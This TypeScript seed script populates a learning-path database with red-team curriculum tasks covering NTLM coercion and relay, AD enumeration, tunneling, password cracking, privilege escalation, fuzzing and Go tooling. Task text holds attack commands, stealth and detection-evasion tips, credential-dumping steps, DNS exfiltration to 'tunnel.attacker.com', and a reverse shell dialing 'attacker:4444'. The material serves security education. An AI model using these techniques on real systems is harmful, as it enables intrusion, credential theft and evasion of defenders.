import Database from 'better-sqlite3';

const db = new Database('data/quest-log.db');

const insertModule = db.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = db.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);
const deleteModules = db.prepare('DELETE FROM modules WHERE path_id = ?');

const now = Date.now();

function addModuleWithTasks(pathId: number, moduleName: string, moduleDesc: string, orderIndex: number, tasks: [string, string, string][]) {
	const mod = insertModule.run(pathId, moduleName, moduleDesc, orderIndex, now);
	tasks.forEach(([title, desc, details], i) => {
		insertTask.run(mod.lastInsertRowid, title, desc, details, i, now);
	});
}

function expandPath(pathId: number, modules: { name: string; desc: string; tasks: [string, string, string][] }[]) {
	deleteModules.run(pathId);
	modules.forEach((mod, i) => {
		addModuleWithTasks(pathId, mod.name, mod.desc, i, mod.tasks);
	});
}

// Expand all remaining paths with <10 tasks
const needsExpansion = [
	// Reimplement: Authentication Coercion (67)
	{ id: 67, modules: [
		{ name: 'Week 1-2: Coercion Techniques', desc: 'Force authentication', tasks: [
			['Implement PrinterBug/SpoolSample', 'Abuse MS-RPRN RpcRemoteFindFirstPrinterChangeNotification to force any domain machine running Print Spooler to authenticate back to an attacker-controlled host. Example: python3 printerbug.py domain/user@target attackerIP', '## PrinterBug\n\nMS-RPRN RpcRemoteFindFirstPrinterChangeNotification\nForce target to auth to attacker\nWorks on any domain-joined machine'],
			['Build PetitPotam', 'Exploit MS-EFSRPC EfsRpcOpenFileRaw to coerce NTLM authentication without any credentials (unauthenticated). Particularly effective against Domain Controllers. Example: python3 PetitPotam.py attackerIP targetDC', '## PetitPotam\n\nMS-EFSRPC EfsRpcOpenFileRaw\nCoerce auth without credentials\nEffective against DCs'],
			['Add DFSCoerce', 'Use MS-DFSNM NetrDfsAddStdRoot/NetrDfsRemoveStdRoot RPC calls to trigger authentication. Alternative when PrinterBug/PetitPotam are patched. Requires DFS service running on target (common on DCs).', '## DFSCoerce\n\nMS-DFSNM NetrDfsAddStdRoot\nAnother coercion vector\nWorks when others patched'],
			['Implement ShadowCoerce', 'Abuse MS-FSRVP (File Server VSS Agent) IsPathShadowCopied to coerce authentication. Requires VSS Agent service. Less commonly patched. Works on file servers with shadow copies enabled.', '## ShadowCoerce\n\nMS-FSRVP IsPathShadowCopied\nVolume Shadow Copy abuse\nRequires specific config'],
			['Build coercion detector', 'Scan targets to identify which coercion methods work: check if Spooler/EFS/DFS/FSRVP services are running and responding. Test each method carefully, log results. Avoid detection by limiting scan frequency.', '## Detection\n\nCheck which coercion methods work\nTest without triggering alerts\nReport vulnerable services'],
			['Add relay integration', 'Chain coercion with NTLM relay: 1) Run ntlmrelayx listening on SMB/HTTP, 2) Trigger coercion to force target to connect, 3) Relay captured auth to LDAP (ESC8), HTTP (AD CS), or SMB for code execution.', '## Integration\n\nCoerce → NTLM auth → Relay\nTo LDAP, SMB, HTTP, AD CS\nComplete attack chain'],
		] as [string, string, string][] },
	]},

	// Reimplement: BloodHound Collector (64)
	{ id: 64, modules: [
		{ name: 'Week 1-2: Data Collection', desc: 'Gather AD information', tasks: [
			['Query domain users', 'LDAP query all users with filter (objectClass=user). Collect attributes: sAMAccountName, objectSid, userAccountControl (disabled, password never expires, etc.), memberOf, adminCount. Build user inventory.', '## Users\n\nLDAP query all users\nAttributes: name, SID, UAC flags\nGroup memberships'],
			['Enumerate groups', 'Query all groups (objectClass=group). Resolve nested membership recursively (group A member of group B). Flag high-value groups: Domain Admins, Enterprise Admins, Administrators, Backup Operators.', '## Groups\n\nAll domain groups\nNested membership resolution\nHighlight privileged groups'],
			['Collect computer objects', 'Query (objectClass=computer). Extract: dNSHostName, operatingSystem, operatingSystemVersion, msDS-AllowedToDelegateTo (constrained delegation), userAccountControl for TRUSTED_FOR_DELEGATION (unconstrained).', '## Computers\n\nAll domain computers\nOS versions\nDelegation settings'],
			['Query ACLs', 'Read nTSecurityDescriptor attribute on objects. Parse DACL to find: GenericAll, GenericWrite, WriteOwner, WriteDacl, ForceChangePassword, AddMember. These indicate privilege escalation paths.', '## ACLs\n\nSecurity descriptors\nDACL parsing\nIdentify dangerous permissions'],
			['Enumerate sessions', 'NetSessionEnum (port 445) to see who is connected to a machine. NetWkstaUserEnum for logged-in users. Build map of where admins are logged in—targets for credential theft or lateral movement.', '## Sessions\n\nNetSessionEnum\nNetWkstaUserEnum\nMap user-to-machine'],
			['Collect GPO data', 'Query (objectClass=groupPolicyContainer). Get displayName, gPCFileSysPath (SYSVOL location). Enumerate GPO links to OUs. Parse GPO settings for scheduled tasks, scripts, restricted groups (security impact).', '## GPOs\n\nAll GPOs and links\nWhere they apply\nSettings that affect security'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Output & Analysis', desc: 'Format for BloodHound', tasks: [
			['Build JSON output', 'Generate BloodHound-compatible JSON: users.json (principals), computers.json (hosts), groups.json (group memberships), domains.json (trust info). Follow BloodHound schema for neo4j import.', '## JSON Format\n\nSeparate files:\n- users.json\n- computers.json\n- groups.json\n- domains.json'],
			['Implement edge detection', 'Create edges representing relationships: MemberOf (group membership), AdminTo (local admin), CanRDP/CanPSRemote (remote access), GenericAll/WriteDacl (ACL abuse), HasSession (logged-in users).', '## Edges\n\nAdminTo\nCanRDP\nMemberOf\nGenericAll\nWriteDacl'],
			['Add stealth options', 'Reduce detection: throttle LDAP queries (100ms delay), avoid noisy enumeration (sessions), randomize query order, use existing authenticated session, limit collection scope to specific OUs.', '## Stealth\n\n- Throttle queries\n- Avoid certain queries\n- Use existing session'],
			['Build local collection', 'Enumerate local groups via SAMR: who is in Administrators, Remote Desktop Users, Remote Management Users. Requires local admin or from domain to domain-joined machines.', '## Local Groups\n\nWho is local admin\nWho can RDP\nWho can PS remote'],
			['Implement trust enum', 'Query trustedDomain objects. Determine: trust direction (inbound/outbound/bidirectional), trust type (forest/external/parent-child), SID filtering enabled (protects against SID history attacks).', '## Trusts\n\nTrust relationships\nTrust direction\nSID filtering status'],
			['Add certificate template enum', 'Query AD CS: pKIEnrollmentService for CAs, pKICertificateTemplate for templates. Check template permissions, EKUs, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1). Identify vulnerable templates.', '## Cert Templates\n\nVulnerable templates\nCA servers\nEnrollment permissions'],
		] as [string, string, string][] },
	]},

	// Reimplement: Network Tunneling Tools (73)
	{ id: 73, modules: [
		{ name: 'Week 1-2: TCP Tunneling', desc: 'Basic tunneling', tasks: [
			['Build local port forward', 'Listen on local port, forward connections through tunnel to remote target. Example: -L 8080:internalweb:80 lets you browse internalweb:80 via localhost:8080. Useful for accessing internal services from attacker machine.', '## Local Forward\n\n-L 8080:target:80\nListen locally, connect to target\nThrough intermediate host'],
			['Implement remote port forward', 'Listen on remote host, forward back to attacker. Example: -R 4444:localhost:4444 exposes your local port 4444 on the remote. Useful for reverse shells when target cant reach you directly (NAT/firewall bypass).', '## Remote Forward\n\n-R 8080:localhost:80\nListen on remote, connect back\nBypass NAT/firewall'],
			['Add dynamic port forward', 'Create SOCKS5 proxy: -D 1080. Configure proxychains to use localhost:1080. Any tool through proxychains routes via tunnel. Example: proxychains nmap -sT internal_network—scans internal network through compromised host.', '## Dynamic\n\n-D 1080\nSOCKS proxy through tunnel\nRoute any traffic'],
			['Build connection multiplexing', 'Reuse single SSH connection for multiple forwards. ControlMaster/ControlPath in SSH config. One auth, multiple sessions. Faster and stealthier. Example: ssh -M -S /tmp/sock host, then ssh -S /tmp/sock -L ...', '## Mux\n\nSingle SSH connection\nMultiple forwards\nControl socket'],
			['Implement SSH tunneling', 'Full SSH client: password auth, key auth (id_rsa), certificate auth. ProxyJump (-J) for multi-hop: ssh -J jump1,jump2 target. Handle host key verification, connection timeouts, keep-alives.', '## SSH\n\n- Password auth\n- Key auth\n- ProxyJump chains'],
			['Add auto-reconnect', 'Detect connection drops (read timeout, EOF). Automatically reconnect with exponential backoff: 1s, 2s, 4s, max 60s. Persist tunnel across network interruptions. Like autossh but built-in.', '## Resilience\n\nDetect disconnect\nAuto reconnect\nExponential backoff'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Advanced Tunneling', desc: 'Evasion and protocols', tasks: [
			['Build DNS tunnel', 'Encode data in DNS queries: data.xyz.tunnel.attacker.com resolves, response in TXT record. 63-byte label limit, ~500 bps throughput. Bypasses firewalls allowing only DNS (port 53). Use iodine or dnscat2 as reference.', '## DNS Tunnel\n\nEncode data in queries\nExfil via TXT records\nSlow but covert'],
			['Implement ICMP tunnel', 'Embed data in ICMP Echo Request/Reply payload. Many firewalls allow ICMP ping. Requires raw socket (admin/root). Example: ping with 64KB payload. ptunnel is reference implementation.', '## ICMP Tunnel\n\nPayload in ICMP data\nOften allowed through FW\nRequires raw sockets'],
			['Add HTTP tunnel', 'Tunnel TCP over HTTP: long-polling (client keeps connection open, server pushes data) or WebSocket for bidirectional. Looks like normal web browsing. Can go through proxies, CDNs. Chisel uses WebSocket.', '## HTTP Tunnel\n\nLong-poll or WebSocket\nLooks like web traffic\nCDN-able'],
			['Build double pivot', 'Chain: Attacker → Pivot1 → Pivot2 → Target. Run SOCKS on Pivot1, forward through Pivot2. Or nested SSH: ssh -J pivot1 pivot2 -D 1080. Manage routing tables for complex networks.', '## Pivot Chain\n\nHost A → Host B → Host C\nNested tunnels\nRoute through network'],
			['Implement VPN-like mode', 'Create TUN interface: ip tuntap add tun0 mode tun. Route subnets through tunnel: ip route add 10.0.0.0/8 via tun0. Apps use network normally. Ligolo-ng and similar create virtual network interface for transparent access.', '## VPN Mode\n\nTUN interface\nRoute traffic through tunnel\nTransparent to apps'],
			['Add traffic obfuscation', 'Make tunnel traffic blend in: randomize packet sizes/timing to avoid signature detection, mimic normal protocols (HTTPS traffic patterns), use domain fronting. Defeat DPI-based detection.', '## Obfuscation\n\nMake traffic look normal\nRandomize patterns\nMimic protocols'],
		] as [string, string, string][] },
	]},

	// Reimplement: Nuclei Template Scanner (70)
	{ id: 70, modules: [
		{ name: 'Week 1-2: Template Engine', desc: 'Parse and run templates', tasks: [
			['Parse YAML templates', 'Parse template structure: id (unique identifier), info (name, author, severity, tags), requests (HTTP method, path, headers, body). Use gopkg.in/yaml.v3 or PyYAML. Validate required fields.', '## Template Format\n\n```yaml\nid: cve-2021-xxxx\ninfo:\n  name: Vuln Name\n  severity: high\nrequests:\n  - method: GET\n    path: /vuln\n```'],
			['Build HTTP executor', 'Execute template requests: custom headers (User-Agent, Cookie), body templates (JSON, form data), follow redirects (configurable depth), handle cookies across requests in chain. Support raw HTTP mode.', '## HTTP Executor\n\n- Custom headers\n- Body templates\n- Follow redirects\n- Handle cookies'],
			['Implement matchers', 'Match conditions to detect vulnerabilities: status (200, 500), body contains word/regex (error, password), header matches, response time > threshold (for time-based attacks). AND/OR matcher logic.', '## Matchers\n\n- Status code\n- Body contains\n- Regex match\n- Word match\n- Binary match'],
			['Add extractors', 'Extract data from responses: regex with capture groups (version: ([0-9.]+)), JSONPath ($.data.token), XPath for HTML. Store in variables for use in subsequent requests. Report extracted values.', '## Extractors\n\n- Regex capture groups\n- JSON path\n- XPath\n- DSL expressions'],
			['Build template variables', 'Dynamic substitution: {{BaseURL}} = http://target, {{Host}} = target hostname, {{randstr}} = random string, {{md5("test")}} = hash. Custom variables from extractors or command line.', '## Variables\n\n{{BaseURL}}\n{{Host}}\n{{randstr}}\nCustom variables'],
			['Implement workflows', 'Conditional template execution: if tech-detect.yaml matches "WordPress", run wordpress-vuln.yaml. Chain templates with logic. Useful for fingerprinting then targeted scanning.', '## Workflows\n\nIf template A matches\nThen run template B\nConditional logic'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Scanner Features', desc: 'Full scanner', tasks: [
			['Build target management', 'Input sources: -u URL, -l file with URLs, CIDR range expansion (192.168.1.0/24), stdin piping from other tools. Dedup targets, normalize URLs, validate format. Support both HTTP and HTTPS.', '## Targets\n\n- URL list\n- CIDR ranges\n- File input\n- Stdin'],
			['Add rate limiting', 'Control scan speed: -rate-limit 100 (requests/second), -c 50 (concurrent hosts), per-host connection limits. Avoid overwhelming targets or triggering WAF. Configurable delays between requests.', '## Rate Limiting\n\n- Requests per second\n- Concurrent hosts\n- Per-host limits'],
			['Implement severity filtering', 'Filter templates: -severity critical,high skips low/medium. -tags cve,xss runs specific categories. -exclude-templates path excludes files. -include-templates for specific checks.', '## Filtering\n\n- By severity\n- By tag\n- By ID\n- Include/exclude'],
			['Build output formats', 'Multiple outputs: JSON (structured for parsing), JSONL (one JSON per line for streaming), Markdown (human-readable reports), SARIF (for code scanning integration). Include template ID, URL, extracted data.', '## Output\n\n- JSON\n- JSONL\n- Markdown\n- SARIF'],
			['Add headless browser', 'Chromium for JavaScript-heavy sites: wait for page load, execute JS, check rendered DOM. Useful for SPAs. Use chromedp or playwright. Screenshot capability for evidence. Slower but more accurate.', '## Headless\n\nFor JS-heavy sites\nChromium integration\nDOM-based checks'],
			['Implement interactsh', 'Out-of-band detection: run callback server (xxxxx.oast.me), inject URL in payloads, detect callbacks. Finds blind SSRF, XXE, RCE. Example: {{interactsh-url}} in template triggers external interaction detection.', '## OOB Testing\n\nCallback server\nDetect blind vulns\nSSRF, XXE, etc.'],
		] as [string, string, string][] },
	]},

	// Reimplement: Password Cracker (71)
	{ id: 71, modules: [
		{ name: 'Week 1-2: Hash Cracking', desc: 'Core cracking', tasks: [
			['Implement hash functions', 'Support common hashes: MD5 (32 hex), SHA1/256/512, NTLM (MD4 of UTF-16LE), NetNTLMv2 (challenge-response), bcrypt ($2a$10$...), scrypt. Handle salts, iterations. Use OpenSSL or hashlib.', '## Hash Functions\n\nMD5, SHA1, SHA256\nNTLM, NetNTLM\nbcrypt, scrypt'],
			['Build dictionary attack', 'Load wordlist (rockyou.txt has 14M entries). Hash each candidate, compare to target hash. Example: for word in wordlist: if hash(word) == target: found! Show progress percentage and speed.', '## Dictionary\n\nRead wordlist\nHash each word\nCompare to target'],
			['Add rule engine', 'Transform words: $1 (append 1: password→password1), ^! (prepend: password→!password), c (capitalize: password→Password), r (reverse: password→drowssap), sa@ (substitute: password→p@ssword).', '## Rules\n\n$1 - append 1\n^! - prepend !\nc - capitalize\nr - reverse'],
			['Implement mask attack', 'Brute force with pattern: ?l=a-z, ?u=A-Z, ?d=0-9, ?s=symbols, ?a=all. Example: ?u?l?l?l?l?d?d = Passw00 through Zzzzzz99. Incremental: --increment for variable length. Custom charsets: -1 abc.', '## Masks\n\n?l = lowercase\n?u = uppercase\n?d = digit\n?s = special'],
			['Build combinator attack', 'Combine two wordlists: word1 + word2. Example: "pass" + "word" = "password", "winter" + "2024" = "winter2024". Generates cartesian product. Effective for passphrase-style passwords.', '## Combinator\n\nword1 + word2\nFrom two wordlists\nGenerates combinations'],
			['Add hybrid attack', 'Wordlist + mask: hashcat -a 6 wordlist ?d?d?d appends 3 digits (password→password123). Or -a 7 prepends mask. More efficient than pure brute force, more thorough than dictionary alone.', '## Hybrid\n\npassword?d?d?d\nWordlist base + pattern'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Performance', desc: 'Optimization', tasks: [
			['Implement multi-threading', 'Partition keyspace across CPU cores. Worker pool with thread-safe queue. Each thread hashes candidates independently. Linear speedup with cores. Example: 8 cores = 8x faster than single-threaded.', '## Threading\n\nPartition keyspace\nWorker threads\nThread-safe queue'],
			['Add GPU support', 'GPUs have thousands of cores for parallel hashing. Use CUDA (NVIDIA) or OpenCL (AMD/cross-platform). RTX 3090: ~100 billion MD5/s vs ~10 million on CPU. 10,000x speedup for some algorithms.', '## GPU\n\nMassively parallel\nThousands of cores\nMuch faster than CPU'],
			['Build resume support', 'Checkpoint progress: save current position in keyspace, wordlist offset, attack configuration. On interrupt (Ctrl+C), write restore file. On restart, --restore continues from checkpoint. Essential for long attacks.', '## Resume\n\nCheckpoint state\nResume interrupted attacks\nTrack progress'],
			['Implement potfile', 'Store cracked hashes: hash:plaintext format. Before cracking, check potfile to skip already-cracked hashes. Append new cracks. Share across sessions. Example: ~/.hashcat/hashcat.potfile.', '## Potfile\n\nhash:plaintext\nDon\'t recrack known\nShare across sessions'],
			['Add distributed mode', 'Split keyspace across machines: --skip N --limit M. Central coordinator assigns ranges. Workers report results. Aggregate on completion. Linear scaling with node count. Use hashtopolis for management.', '## Distributed\n\nSplit keyspace\nCoordinate workers\nAggregate results'],
			['Build benchmarking', 'Measure performance: hashes/second for each algorithm and attack mode. hashcat -b tests all. Compare hardware. Example: RTX 4090 vs RTX 3080 for NTLM, WPA2, bcrypt. Guide attack strategy.', '## Benchmark\n\nHashes per second\nPer hash type\nPer attack mode'],
		] as [string, string, string][] },
	]},

	// Reimplement: Privilege Escalation Enumeration (72)
	{ id: 72, modules: [
		{ name: 'Week 1-2: Linux Enumeration', desc: 'Linux privesc checks', tasks: [
			['Check SUID binaries', 'Find SUID binaries: find / -perm -4000 2>/dev/null. These run as owner (often root). Check GTFOBins for exploitable binaries like find, vim, python. Example: find has -exec, vim can shell out.', '## SUID\n\n```bash\nfind / -perm -4000 2>/dev/null\n```\n\nCheck GTFOBins for exploits'],
			['Enumerate capabilities', 'Check capabilities: getcap -r / 2>/dev/null. CAP_SETUID allows UID change (instant root). CAP_NET_RAW for packet capture. CAP_DAC_READ_SEARCH reads any file. Example: python3 with cap_setuid=ep.', '## Capabilities\n\n```bash\ngetcap -r / 2>/dev/null\n```\n\nCAP_SETUID, CAP_NET_RAW, etc.'],
			['Check sudo permissions', 'Run sudo -l to see allowed commands. NOPASSWD entries need no password. Wildcards exploitable: sudo /bin/cat /var/log/* allows /var/log/../../etc/shadow. Check GTFOBins for each allowed binary.', '## Sudo\n\nWhat can current user sudo?\nNOPASSWD entries\nWildcard abuse'],
			['Find writable paths', 'Check $PATH for writable directories: find ${PATH//:/ } -writable 2>/dev/null. If cron or script uses relative command (e.g., "backup" not "/usr/bin/backup"), place malicious binary in writable PATH dir.', '## PATH\n\nWritable dirs in PATH?\nCron jobs with relative paths\nHijack commands'],
			['Enumerate cron jobs', 'Check: /etc/crontab, /etc/cron.d/*, /var/spool/cron/crontabs/*. Look for: writable scripts being run, relative paths (hijack), wildcards (tar --checkpoint abuse). Run pspy to see scheduled executions live.', '## Cron\n\n/etc/crontab\n/etc/cron.d/*\n/var/spool/cron/\nWritable scripts?'],
			['Check kernel version', 'Get kernel: uname -a, cat /etc/os-release. Search exploitdb/searchsploit for vulnerabilities. Common: Dirty COW (CVE-2016-5195), overlayfs, netfilter. Compile exploit on similar kernel version.', '## Kernel\n\nuname -a\nSearch for CVEs\nDirty COW, etc.'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Windows Enumeration', desc: 'Windows privesc checks', tasks: [
			['Check service permissions', 'Query services: sc query state=all. Check ACLs: accesschk -uwcqv "Authenticated Users" *. Unquoted paths: C:\\Program Files\\Vuln App\\service.exe runs C:\\Program.exe first. Writable binary = code execution.', '## Services\n\nUnquoted paths\nWeak service permissions\nWritable service binaries'],
			['Enumerate scheduled tasks', 'List tasks: schtasks /query /fo LIST /v. Check for: tasks running as SYSTEM/admin, writable task files or directories, commands we can modify. High-priv tasks with weak permissions = privesc.', '## Tasks\n\nschtasks /query\nWritable task files\nHigh-priv tasks'],
			['Check AlwaysInstallElevated', 'Check registry: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated. If both HKLM and HKCU keys = 1, any .msi installs as SYSTEM. msfvenom for malicious MSI.', '## MSI\n\nRegistry key check\nInstall MSI as SYSTEM\nEasy privesc'],
			['Find stored credentials', 'Check: cmdkey /list (saved creds), netsh wlan show profiles (WiFi passwords), Chrome/Firefox password stores, reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" (autologon creds).', '## Credentials\n\ncmdkey /list\nWireless passwords\nBrowser passwords\nRegistry autologon'],
			['Check token privileges', 'Run whoami /priv. SeImpersonatePrivilege → Potato attacks (JuicyPotato, PrintSpoofer). SeBackupPrivilege → copy SAM/SYSTEM. SeDebugPrivilege → inject into any process. SeRestorePrivilege → write to protected files.', '## Tokens\n\nSeImpersonate → Potato\nSeBackup → SAM dump\nSeDebug → injection'],
			['Enumerate installed software', 'List software: wmic product get name,version. Check for CVEs in versions. Look for weak folder permissions: icacls "C:\\Program Files\\App". If writable, replace DLLs or binaries for code execution.', '## Software\n\nFind installed versions\nCheck for CVEs\nWeak folder permissions'],
		] as [string, string, string][] },
	]},

	// Reimplement: Web Fuzzer (69)
	{ id: 69, modules: [
		{ name: 'Week 1-2: Fuzzing Core', desc: 'Directory and parameter fuzzing', tasks: [
			['Build URL fuzzer', 'Replace FUZZ in URL with wordlist entries: http://target/FUZZ tests /admin, /backup, /config, etc. Use common.txt, raft-medium-directories.txt from SecLists. Filter responses by status code (200, 301, 403).', '## URL Fuzzing\n\nhttp://target/FUZZ\nReplace FUZZ with wordlist\nFilter by status code'],
			['Implement parameter fuzzer', 'Discover hidden params: ?FUZZ=test finds debug=, admin=, token=. Or ?param=FUZZ fuzzes values. Burp Param Miner wordlist. Detect by: response changes, error messages, different behavior.', '## Params\n\n?FUZZ=value\n?param=FUZZ\nDiscover hidden params'],
			['Add header fuzzing', 'Fuzz header names (X-FUZZ: value) and values (X-Custom: FUZZ). Find debug headers (X-Debug), auth bypasses (X-Forwarded-For: 127.0.0.1), hidden functionality. Check X-Original-URL for path override.', '## Headers\n\nFuzz header names\nFuzz header values\nFind hidden functionality'],
			['Build response filtering', 'Reduce noise: -fc 404 (filter status code), -fs 1234 (filter size), -fw 100 (filter word count), -fr "Not Found" (filter regex). Hide common error pages, show only interesting responses.', '## Filtering\n\n- Filter by status\n- Filter by size\n- Filter by words\n- Filter by regex'],
			['Implement recursion', 'When /admin/ found (301/200), automatically fuzz /admin/FUZZ. Set max depth (-d 3). Avoid infinite loops with visited tracking. Finds nested directories: /api/v1/users/admin/.', '## Recursion\n\nFound /admin/\nFuzz /admin/FUZZ\nConfigurable depth'],
			['Add rate limiting', 'Control speed: -rate 100 (requests/sec), -p 0.1 (delay between requests), -t 50 (concurrent threads). Respect target limits, avoid WAF blocks, be polite to production systems.', '## Rate Limit\n\n- Requests per second\n- Concurrent connections\n- Per-host limits'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Advanced Features', desc: 'Full fuzzer', tasks: [
			['Build multiple wordlist support', 'Clusterbomb mode: /FUZZ1/FUZZ2/FUZZ3 with separate wordlists. Tests all combinations. Example: /{user,admin}/{login,dashboard}. Also pitchfork mode: parallel iteration through lists.', '## Multi-wordlist\n\n/FUZZ1/FUZZ2\nTwo wordlists\nAll combinations'],
			['Implement POST fuzzing', 'Fuzz POST body: -d "user=FUZZ&pass=FUZZ" or JSON: -d \'{"user":"FUZZ"}\'. File upload: fuzz filename, content-type, file contents. Form data with multipart/form-data support.', '## POST\n\n-d "user=FUZZ&pass=FUZZ"\nJSON body fuzzing\nFile upload fuzzing'],
			['Add output formats', 'Save results: -o results.json (JSON), -o results.csv (CSV). Include: URL, status, size, response time. HTML report with sortable tables, filter controls. Export for further analysis.', '## Output\n\n- JSON\n- CSV\n- HTML report'],
			['Build matcher system', 'Positive matching (show only matches): -mc 200 (status), -ms "admin" (string), -mr "password:\\s*\\w+" (regex). Opposite of filters. Find specific response patterns across fuzz results.', '## Matchers\n\nMatch on status, size, regex\nInverse of filters\nFind specific responses'],
			['Implement auto-calibration', 'Send baseline requests to learn "normal" response. Auto-filter responses matching baseline (same size, same words). Adapts to target. Handles custom 404 pages that return 200 status.', '## Calibration\n\nSend baseline requests\nAuto-detect response patterns\nFilter dynamically'],
			['Add extension scanning', 'Fuzz file extensions: filename.FUZZ tests .php, .asp, .aspx, .bak, .old, .txt. Combine: FUZZ.FUZZ2 for filename + extension. Find backup files, source code, old versions.', '## Extensions\n\n/file.FUZZ\n.php, .asp, .bak, .old\nCombine with filenames'],
		] as [string, string, string][] },
	]},

	// Reimplement: ntlmrelayx (66)
	{ id: 66, modules: [
		{ name: 'Week 1-2: NTLM Relay Core', desc: 'Relay mechanics', tasks: [
			['Implement NTLM server', 'Build SMB/HTTP/LDAP servers that request NTLM auth. When victim sends Type 1, forward to target, get Type 2 challenge, send to victim. Victim responds with Type 3, forward to target. Now authenticated as victim.', '## NTLM Server\n\nSMB, HTTP, LDAP server\nSend Type 2 challenge from target\nReceive Type 3, forward'],
			['Build SMB relay', 'Relay captured NTLM to SMB (port 445). Cannot relay to same machine (MS08-068 fix). Relay to different server where victim has admin. Execute commands via SCM service creation or WMI.', '## SMB Relay\n\nCan\'t relay to same machine\nRelay to other servers\nExecute via SMBExec/Atexec'],
			['Add LDAP relay', 'Relay to LDAP (port 389). Actions: add computer account (MAQ), modify ACLs (grant DCSync rights), set msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD). Powerful for domain privilege escalation.', '## LDAP Relay\n\nAdd computer account\nModify ACLs\nResource-based delegation'],
			['Implement HTTP relay', 'Relay to HTTP services: AD CS web enrollment (/certsrv) for ESC8, Exchange Web Services (EWS) for email access, OWA for Outlook access. Request certificates or access mailboxes as victim.', '## HTTP Relay\n\nAD CS web enrollment\nExchange (EWS, OWA)\nSharePoint'],
			['Build multi-relay', 'Try multiple targets with captured auth. List of targets file. First successful relay wins. Useful when victim has admin on multiple hosts. Report which target succeeded for follow-up.', '## Multi-Relay\n\nRelay to multiple targets\nTry each one\nFirst success wins'],
			['Add signing detection', 'Check if SMB/LDAP signing required before relay attempt. SMB: negotiate response flags. LDAP: check domain policy. If signing required, relay fails—don\'t waste the captured auth. Report status.', '## Signing\n\nSMB signing = no relay\nLDAP signing = no relay\nDetect before trying'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Attack Chains', desc: 'Post-relay actions', tasks: [
			['Implement secretsdump', 'After successful relay, dump credentials: SAM (local accounts), LSA secrets (service passwords), cached domain creds. If DC admin, dump NTDS.dit. No need to know victim\'s password—relay handles auth.', '## Secrets\n\nRelay admin auth\nDump SAM, LSA, NTDS\nNo credentials needed'],
			['Build RBCD attack', 'Relay to LDAP: add attacker\'s computer SID to target\'s msDS-AllowedToActOnBehalfOfOtherIdentity. Then S4U2Self to get ticket as admin, S4U2Proxy to target. Full compromise via relay.', '## RBCD\n\nRelay to LDAP\nSet msDS-AllowedToActOnBehalfOfOtherIdentity\nS4U2Self/S4U2Proxy'],
			['Add shadow credentials', 'Relay to LDAP: add certificate to target\'s msDS-KeyCredentialLink. Generate matching private key. Authenticate via PKINIT using the certificate. No password needed, just the certificate.', '## Shadow Creds\n\nRelay to LDAP\nAdd KeyCredentialLink\nPKINIT authentication'],
			['Implement AD CS attack', 'ESC8: relay NTLM to CA web enrollment (/certsrv). Request certificate on behalf of victim using their relayed auth. Use certificate for PKINIT authentication. Full account compromise via cert.', '## ESC8\n\nRelay to CA web enrollment\nRequest cert for victim\nAuth as victim'],
			['Build SOCKs proxy', 'Maintain authenticated SMB session after relay. Expose as SOCKS proxy on local port. Route tools through proxy to use victim\'s authenticated session. Access shares, run commands via session.', '## SOCKS\n\nMaintain relayed session\nExpose as SOCKS proxy\nRoute tools through'],
			['Add loot capture', 'Log all captured authentications: timestamp, source IP, username, NTLMv2 hash. Save hashes for offline cracking. Even failed relays provide valuable hashes. Track credentials for later use.', '## Loot\n\nCapture NTLMv2 hashes\nSave for offline cracking\nLog all attempts'],
		] as [string, string, string][] },
	]},

	// Red Team Tooling: Go (55)
	{ id: 55, modules: [
		{ name: 'Week 1-2: Go Fundamentals', desc: 'Go for security tools', tasks: [
			['Set up Go environment', 'Install Go from golang.org. Set GOPATH and add to PATH. Initialize module: go mod init myproject. Use VS Code with Go extension for autocompletion and debugging support.', '## Setup\n\nInstall Go\nSet GOPATH\ngo mod init'],
			['Learn concurrency', 'Goroutines: go func() { work() }(). Channels for communication: ch := make(chan int). Select for multiplexing: select { case msg := <-ch1: case ch2 <- val: }. WaitGroup for synchronization.', '## Concurrency\n\ngo func() { ... }()\nchan for communication\nselect for multiplexing'],
			['Implement network operations', 'TCP client: net.Dial("tcp", "host:port"). Server: net.Listen("tcp", ":8080"), accept connections. HTTP: http.Get, http.Client with custom transport. Raw sockets with net.DialIP.', '## Networking\n\nnet.Dial, net.Listen\nTCP/UDP sockets\nHTTP client/server'],
			['Build process execution', 'Run commands: cmd := exec.Command("cmd", "/c", "dir"); output, err := cmd.CombinedOutput(). Pipe stdin/stdout. Set env vars. Hide window on Windows (SysProcAttr).', '## Execution\n\nexec.Command()\nCapture output\nPipes'],
			['Add file operations', 'Read: os.ReadFile("path"). Write: os.WriteFile("path", data, 0644). Walk dirs: filepath.Walk(root, func(path string, info os.FileInfo, err error) error {...}). Handle permissions.', '## Files\n\nos.Open, os.Create\nDirectory walking\nPermission handling'],
			['Implement cross-compilation', 'Build for Windows from Linux: GOOS=windows GOARCH=amd64 go build. Static binary: CGO_ENABLED=0. Output: -o filename.exe. Builds for any platform from any platform without toolchain.', '## Cross-compile\n\nGOOS=windows GOARCH=amd64\nStatic binaries\nCGO considerations'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Security Tools', desc: 'Build tools in Go', tasks: [
			['Build port scanner', 'Concurrent TCP connect: spawn goroutine per port, use semaphore to limit concurrency. Timeout with net.DialTimeout. Grab service banners: read initial bytes after connect. Report open ports.', '## Scanner\n\nConcurrent connections\nService detection\nBanner grabbing'],
			['Implement reverse shell', 'Connect to attacker: conn, _ := net.Dial("tcp", "attacker:4444"). Start shell: exec.Command("cmd.exe"). Redirect stdin/stdout/stderr to connection. Loop reading commands, sending output.', '## Reverse Shell\n\nConnect back\nExecute commands\nReturn output'],
